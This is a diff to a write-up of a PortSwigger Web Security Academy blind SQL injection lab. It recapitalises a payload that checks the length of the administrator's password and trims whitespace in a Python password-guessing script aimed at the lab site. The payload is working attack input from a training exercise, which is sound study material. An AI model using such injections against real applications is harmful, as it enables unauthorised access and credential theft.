@@ -37,7 +37,7 @@ To solve the lab, log in as the administrator user.
 4/ Enumerate the password of the "administrator" user
 
 ```sql
-' AND (SELECT username FROM users WHERE username='administrator' and LENGTH(password)=20)='administrator'--
+' AND (SELECT username FROM users WHERE username='administrator' AND LENGTH(password)=20)='administrator'--
 ```
 
 ```sql
@@ -53,7 +53,6 @@ import string
 url = "https://0a36003103597773822975c400e80054.web-security-academy.net"
 
 characters = string.ascii_letters + string.digits
-
 password = ""
 
 session = requests.Session()
